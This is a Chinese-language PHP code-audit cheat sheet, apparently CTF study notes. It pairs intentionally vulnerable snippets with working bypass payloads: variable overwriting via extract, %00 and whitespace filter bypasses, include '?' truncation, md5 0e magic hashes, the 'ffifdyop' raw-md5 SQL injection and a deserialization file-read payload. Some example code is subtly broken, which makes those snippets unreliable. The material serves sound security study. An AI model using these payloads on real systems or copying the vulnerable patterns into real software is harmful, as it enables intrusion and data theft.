# PHP代码审计
```
http://localhost/phpbugs/
```
## 变量覆盖
### extract()
该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。条件：若有EXTR_SKIP则不行。
```php
<?php
$a = "Original";
$my_array = array("a" => "Cat","b" => "Dog", "c" => "Horse");
extract($my_array); 
echo "\$a = $a; \$b = $b; \$c = $c";
?>
# 结果：$a = Cat; $b = Dog; $c = Horse
```
这里原来是$a是original，后面通过extract把$a覆盖变成了Cat了,所以这里把原来的变量给覆盖了。

### parse_str()
解析字符串并注册成变量
```php
$b=1;
Parse_str('b=2');
Print_r($b);
# 结果: $b=2
```

### import_request_variables()
```php
将 GET/POST/Cookie 变量导入到全局作用域中，全局变量注册。
在5.4之后被取消，只可在4-4.1.0和5-5.4.0可用。
//导入POST提交的变量值，前缀为post_
import_request_variable("p"， "post_");
//导入GET和POST提交的变量值，前缀为gp_，GET优先于POST
import_request_variable("gp"， "gp_");
//导入Cookie和GET的变量值，Cookie变量值优先于GET
import_request_variable("cg"， "cg_");
```

### $$变量覆盖

```php

```


### 案例
```php
#?shiyan=&flag=1
<?php
$flag='xxx'; 
extract($_GET);
 if(isset($shiyan))
 { 
    $content=trim(file_get_contents($flag)); # content is 0 , flag can be anything,cause file_get_contents cannot open file, return 0
    if($shiyan==$content)
    { 
        echo'ctf{xxx}'; 
    }
   else
   { 
    echo'Oh.no';
   } 
   }
?>
```

## 绕过过滤的空白字符

原理：https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6

```
控制码
"\0" "%00" (ASCII  0 (0x00))，空字节符。

制表符
"\t" (ASCII  9 (0x09))，水平制表符。

空白字符：
"\n" (ASCII 10 (0x0A))，换行符。
"\v" "\x0b" (ASCII  11 (0x0B))，垂直制表符。
"\f" "%0c" 换页符
"\r" "%0d"(ASCII  13 (0x0D))，回车符。

空格:
" " "%20" (ASCII  32 (0x20))，普通空格符。
```

而trim过滤的空白字符有
```php
string trim ( string $str [, string $character_mask = " \t\n\r\0\x0B" ] )
```
其中缺少了\f

2 函数对空白字符的特性
is_numeric函数在开始判断前，会先跳过所有空白字符。这是一个特性。
也就是说，is_numeirc(" \r\n \t 1.2")是会返回true的。同理，intval(" \r\n \t 12")，也会正常返回12。



案例

https://github.com/bowu678/php_bugs/blob/master/02%20%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6.php
```php
#?number=%00%0c191
# 1 %00绕过is_numeric
# 2 \f（也就是%0c）在数字前面，trim，intval和is_numeric都会忽略这个字符
```

## intval整数溢出

php整数上限溢出绕过intval

intval 函数最大的值取决于操作系统。 
32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval('1000000000000') 会返回 2147483647。
64 位系统上，最大带符号的 integer 值是 9223372036854775807。

## intval 四舍五入


```php
# ?a=1024.1
<?php
if($_GET[id]) {
mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
mysql_select_db(SAE_MYSQL_DB);
$id = intval($_GET[id]); ## 这里过滤只有一个intval
$query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'"));
if ($_GET[id]==1024) {
    echo "<p>no! try again</p>";
    }
  else{
    echo($query[content]);
  }
}
```

## 浮点数精度忽略
```php
if ($req["number"] != intval($req["number"]))
```
在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了。
输入number = 1.00000000000000010, 右边变成1.0, 而左与右比较会相等。




## 多重加密


题目中有：
```php
$login = unserialize(gzuncompress(base64_decode($requset['token'])));
if($login['user'] === 'ichunqiu'){echo $flag;}
```
本地则写：
```php
<?php
$arr = array(['user'] === 'ichunqiu');
$token = base64_encode(gzcompress(serialize($arr)));
print_r($token);
// 得到eJxLtDK0qs60MrBOAuJaAB5uBBQ=
?>
```

## 截断

### iconv 可用chr(128)截断

echo iconv('GB2312', 'UTF-8', $str); //将字符串的编码从GB2312转到UTF-8

### eregi、ereg可用%00截断

功能：正则匹配过滤
条件：要求php<5.3.4

```php
## http://127.0.0.1/Php_Bug/05.php?password=1e9%00*-*
#GET方式提交password，然后用ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母，继续strlen()限制了长度小于8并且大小必须大于9999999，继续strpos()对password进行匹配，必须含有-，最终才输出flag
#因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。
#对于另一个难题可以使用科学计数法表示，计算器或电脑表达10的的幂是一般是e，也就是1.99714e13=19971400000000，所以构造 1e8 即 100000000 > 9999999，在加上-。于是乎构造password=1e8%00*-*,成功得到答案
<?php
if (isset ($_GET['password'])) {
    if (ereg ("^[a-zA-Z0-9]+$",$_GET['password']) === FALSE)    
       {
        echo '<p>You password must be alphanumeric</p>';
    }
    else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
    {
        if (strpos ($_GET['password'], '*-*') !== FALSE)
        {
            die('Flag: ' . $flag);
        }
        else
        {
            echo('<p>*-* have not been found</p>');
        }
    }
    else
    {
        echo '<p>Invalid password</p>';
    }
}
```


### move_uploaded_file 用\0截断
5.4.x<= 5.4.39, 5.5.x<= 5.5.23, 5.6.x <= 5.6.7
原来在高版本（受影响版本中），PHP把长度比较的安全检查逻辑给去掉了，导致了漏洞的发生
cve：
https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348

`move_uploaded_file($_FILES['x']['tmp_name'],"/tmp/test.php\x00.jpg")`
上传抓包修改name为a.php\0jpg（\0是nul字符），可以看到$_FILES['xx']['name']存储的字符串是a.php，不会包含\0截断之后的字符，因此并不影响代码的验证逻辑。
但是如果通过$_REQUEST方式获取的，则可能出现扩展名期望值不一致的情况，造成“任意文件上传”。

### inclue用？截断

```php
<?php
$name=$_GET['name'];  
$filename=$name.'.php';  
include $filename;  
?>
```
当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。
测试POC：
http://127.0.0.1/test/t1.php?name=http://127.0.0.1/test/secret.txt?
则会打开secret.txt中的文件内容。本测试用例在PHP5.5.38版本上测试通过。

### 系统长度截断
这种方式在PHP5.3以后的版本中都已经得到了修复。
win260个字符，linux下4*1024=4096字节

### mysql长度截断
mysql内的默认字符长度为255，超过的就没了。
由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning

### mysql中utf-8截断

`insert into dvwa.test values (14,concat("admin",0xc1,"abc"))`

写入为admin


## 弱类型比较

原理

比较表：http://php.net/manual/zh/types.comparisons.php

以下等式会成立
```php
'' == 0 == false
'123' == 123
'abc' == 0
'123a' == 123
'0x01' == 1
'0e123456789' == '0e987654321'
[false] == [0] == [NULL] == ['']
NULL == false == 0
true == 1
```

### ==、>、<的弱类型比较

这里用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型转换成整型再比。

```php
##方法1
##$a["a1"]="1e8%00";
##这里用%00绕过is_numeric,然后1e8可以比1336大，因此最后能$v1=1
##方法2
##$a["a1"]=["a"];
##使用数组，可以，因为数组恒大于数字或字符串
##方法3
##$a["a1"]=1337a;
##1337a过is_numeric，又由>转成1337与1336比较
<?php
is_numeric(@$a["a1"])?die("nope"):NULL;    
if(@$a["a1"]){
		var_dump($a);
        ($a["a1"]>1336)?$v1=1:NULL;
}
var_dump($v1);
```

### switch 弱类型
```php
// 第一种：弱类型，1e==1
// $x1=1e
// 第二种：利用数组名字bypass
// $x1=1[]
// 传入后为string(3) "1[]",但在switch那里为1
if (isset($_GET['x1']))
{ 
        $x1 = $_GET['x1']; 
        $x1=="1"?die("ha?"):NULL; 
        switch ($x1) 
        { 
        case 0: 
        case 1: 
                $a=1; 
                break; 
        } 
}
```

### md5比较（0e相等、数组为Null）
```php
md5('240610708') //0e462097431906509019562988736854
md5('QNKCDZO') //0e830400451993494058024219903391
0e 纯数字这种格式的字符串在判断相等的时候会被认为是科学计数法的数字，先做字符串到数字的转换。
md5('240610708')==md5('QNKCDZO'); //True
md5('240610708')===md5('QNKCDZO'); //False

这样的对应数值还有：
var_dump(md5('240610708') == md5('QNKCDZO'));
var_dump(md5('aabg7XSs') == md5('aabC9RqS'));
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
var_dump('0010e2' == '1e3');
var_dump('0x1234Ab' == '1193131');
var_dump('0xABCdef' == ' 0xABCdef');
```
技巧：找出在某一位置开始是0e的，并包含“XXX”的字符串

```php
#方法1
#s1=QNKCDZO&s2=240610708
#方法2
#?s1[]=1&s2[]=2
#利用md5中md5([1,2,3]) == md5([4,5,6]) ==NULL，md5一个list结果为Null
#则可以使：[1] !== [2] && md5([1]) ===md5([2])
define('FLAG', 'pwnhub{THIS_IS_FLAG}');
if ($_GET['s1'] != $_GET['s2']
&& md5($_GET['s1']) == md5($_GET['s2'])) {
echo "success, flag:" . FLAG;
}
```

```php
##这里没有弱类型，但可以让$r查出来是Null，然后提交md5里放数组得Null，于是Null===Null
$name = addslashes($_POST['name']);
$r = $db->get_row("SELECT `pass` FROM `user` WHERE `name`='{$name}'");
if ($r['pass'] === md5($_POST['pass'])) {
echo "success";
}
```

### json传数据{"key":0}
PHP将POST的数据全部保存为字符串形式，也就没有办法注入数字类型的数据了而JSON则不一样，JSON本身是一个完整的字符串，经过解析之后可能有字符串，数字，布尔等多种类型。
```
application/x-www-form-urlencoded
multipart/form-data
application/json
application/xml
```
第一个application/x-www-form-urlencoded，是一般表单形式提交的content-type第二个，是包含文件的表单。第三，四个，分别是json和xml，一般是js当中上传的.

{"key":"0"}

这是一个字符串0，我们需要让他为数字类型，用burp拦截，把两个双引号去掉，变成这样：

{"key":0}

### strcmp漏洞1：返回0
适用与5.3之前版本的php

`int strcmp ( string $str1 , string $str2 )`
// 参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。
当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0,所以可以故意让其报错，则返回0，则相等了。

```php
##flag[]=admin
define('FLAG', 'pwnhub{THIS_IS_FLAG}');
if (strcmp($_GET['flag'], FLAG) == 0) {
echo "success, flag:" . FLAG;
}
```

### strcmp漏洞2：返回Null
修复了上面1的返回0的漏洞，即大于5.3版本后，变成返回NULL。
array和string进行strcmp比较的时候会返回一个null，因为strcmp只会处理字符串参数，如果给个数组的话呢，就会返回NULL。
`strcmp($c[1],$d) `


### strcmp漏洞3: 判断使用的是 ==

而判断使用的是==，当NULL==0是 bool(true)

### in_array，array_search 弱类型比较

松散比较下，任何string都等于true：

```php
// in_array('a', [true, 'b', 'c'])       // 返回bool(true)，相当于数组里面有字符'a'
// array_search('a', [true, 'b', 'c'])   // 返回int(0)，相当于找到了字符'a'
// array_search 会使用'ctf'和array中的每个值作比较，这里的比较也是弱比较，所以intval('ctf')==0.
if(is_array(@$a["a2"])){
        if(count($a["a2"])!==5 OR !is_array($a["a2"][0])) die("nope");
        $pos = array_search("ctf", $a["a2"]);
        $pos===false?die("nope"):NULL;
        foreach($a["a2"] as $key=>$val){
            $val==="ctf"?die("nope"):NULL;
        }
        $v2=1;
}
```

### sha1() md5() 报错相等绕过（False === False）
sha1()函数默认的传入参数类型是字符串型，给它传入数组会出现错误，使sha1()函数返回错误，也就是返回false
md5()函数如果成功则返回已计算的 MD5 散列，如果失败则返回 FALSE。可通过传入数组，返回错误。
```php
##?name[]=1&password[]=2
## === 两边都是false则成立
if ($_GET['name'] == $_GET['password'])
    echo '<p>Your password can not be your name!</p>';
else if (sha1($_GET['name']) === sha1($_GET['password']))
    die('Flag: '.$flag);
```


### strpos数组NULL(Null !== False)

strpos()输入数组出错返回null

```php
#既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.
<?php
$flag = "flag";
    if (isset ($_GET['nctf'])) {
        if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE) # %00截断
            echo '必须输入数字才行';
        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)   
            die('Flag: '.$flag);
        else
            echo '骚年，继续努力吧啊~';
    }
 ```

### 十六进制与十进制比较

== 两边的十六进制与十进制比较，是可以相等的。

```php
#?password=0xdeadc0de
#echo  dechex ( 3735929054 ); // 将3735929054转为16进制结果为：deadc0de
<?php
error_reporting(0);
function noother_says_correct($temp)
{
    $flag = 'flag{test}';
    $one = ord('1');  //ord — 返回字符的 ASCII 码值
    $nine = ord('9'); //ord — 返回字符的 ASCII 码值
    $number = '3735929054';
    // Check all the input characters!
    for ($i = 0; $i < strlen($number); $i++)
    { 
        // Disallow all the digits!
        $digit = ord($temp{$i});
        if ( ($digit >= $one) && ($digit <= $nine) ) ## 1到9不允许，但0允许
        {
            // Aha, digit not allowed!
            return "flase";
        }
    }
    if($number == $temp) # 
        return $flag;
}
$temp = $_GET['password'];
echo noother_says_correct($temp);
```


## md5注入带入’or’
原理：
```php
md5(string,raw)
raw	可选。规定十六进制或二进制输出格式：
    TRUE - 原始 16 字符二进制格式
    FALSE - 默认。32 字符十六进制数
```
当md5函数的第二个参数为True时，编码将以16进制返回，再转换为字符串。而字符串’ffifdyop’的md5加密结果为`'or'<trash>` 其中 trash为垃圾值，or一个非0值为真，也就绕过了检测。
```php
## 执行顺序:字符串：ffifdyop -> md5()加密成276f722736c95d99e921722cf9ed621c->md5(,true)将16进制转成字符串`'or'<trash>`->sql执行`'or'<trash>`造成注入
$sql = "SELECT * FROM admin WHERE username = admin pass = '".md5($password,true)."'";
```

## switch没有break
```php
#这里case 0 和 1 没有break,使得程序继续往下执行。
<?php
error_reporting(0);
if (isset($_GET['which']))
{
    $which = $_GET['which'];
    switch ($which)
    {
    case 0:
    case 1:
    case 2:
        require_once $which.'.php';
         echo $flag;
        break;
    default:
        echo GWF_HTML::error('PHP-0817', 'Hacker NoNoNo!', false);
        break;
    }
}
```

## 反序列化

```php
<!-- index.php -->
<?php 
	require_once('shield.php');
	$x = new Shield();
	isset($_GET['class']) && $g = $_GET['class'];
	if (!empty($g)) {
		$x = unserialize($g);
	}
	echo $x->readfile();
?>
<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>
<!-- shield.php -->
<?php
	//flag is in pctf.php
	class Shield {
		public $file;
		function __construct($filename = '') {
			$this -> file = $filename;
		}
		
		function readfile() {
			if (!empty($this->file) && stripos($this->file,'..')===FALSE  
			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
				return @file_get_contents($this->file);
			}
		}
	}
?>
<!-- showimg.php -->
<?php
	$f = $_GET['img'];
	if (!empty($f)) {
		$f = base64_decode($f);
		if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\')===FALSE
		//stripos — 查找字符串首次出现的位置（不区分大小写）
		&& stripos($f,'pctf')===FALSE) {
			readfile($f);
		} else {
			echo "File not found!";
		}
	}
?>
```

```php
#?class=O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}
<!-- answer.php -->
<?php

require_once('shield.php');
$x = class Shield();
$g = serialize($x);
echo $g;

?>

<!-- shield.php -->
<?php
    //flag is in pctf.php
    class Shield {
        public $file;
        function __construct($filename = 'pctf.php') {
            $this -> file = $filename;
        }
        
        function readfile() {
            if (!empty($this->file) && stripos($this->file,'..')===FALSE  
            && stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
                return @file_get_contents($this->file);
            }
        }
    }
?>
```





## 资料

PHP代码审计分段讲解

https://github.com/bowu678/php_bugs


